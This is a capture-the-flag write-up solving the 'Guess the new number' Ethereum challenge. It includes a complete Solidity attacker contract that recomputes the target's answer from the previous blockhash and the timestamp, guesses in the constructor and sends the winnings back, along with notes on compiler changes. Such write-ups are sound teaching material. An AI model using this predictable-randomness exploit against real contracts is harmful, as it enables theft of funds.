# Guess the new number

## Objectives

> The number is now generated on-demand when a guess is made.

## Solution

We just need to code a contract that generates the number the exact same way prior to guessing it. ~~For some reason that I don't quite understand though, the `guess()` call simply would not go through until I tried to do it through the constructor of the contract.~~ I simply didn't have a fallback function to receive the funds, so it worked in the constructor of the contract because before finalizing constructor execution, the funds would have already been sent to my address, but if a fallback function is added, then the funds can be properly received by the contract and the transactions won't fail.

I coded the contract as follows:

```js
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

contract GuessTheNewNumberAttack {
    constructor(address payable challenge) public payable {
        // low-level call success
        bool success;

        // check that we're forwarding the correct amount of funds
        require(msg.value == 1 ether, 'msg.value should be at least 1 ether');

        // get answer
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        
        // make the guess
        (success,) = challenge.call{value:1 ether}(abi.encodeWithSignature("guess(uint8)", answer));
        require(success, "guess failed");

        // send funds back to my account
        (success,) = msg.sender.call{value:address(this).balance}("");
        require(success, 'call failed');
    }
}
```

On deployment, the guess was successful (as it runs in the constructor) and the balance is sent back to my wallet. By simply deploying this contract, the challenge is solved.

This can be solved similarly in the same version of the solidity compiler that the challenge is originally using (0.4.21), but given that I'm using a newer version, there's some small nuances due to changes in the solidity compiler since then:

- `block.blockhash()` has been replaced by `blockhash()`
- `now` has been deprecated in favor of `block.timestamp`
- Now it's not possible to pass multiple parameters to the `keccak256()` hash function, so we must use `abi.encodePacked()` before passing it to `keccak256()`
- It is not possible to cast directly from a hash to uint8, so we must first pass through a type that has the same size in bytes as the value returned by the hash function, so we first cast to uint256 and then to uint8.

## Submission transaction

https://ropsten.etherscan.io/tx/0x9127996a2073acf24ecbfbd3b7f2eeba379c91815658b98e641c7035060a1eba
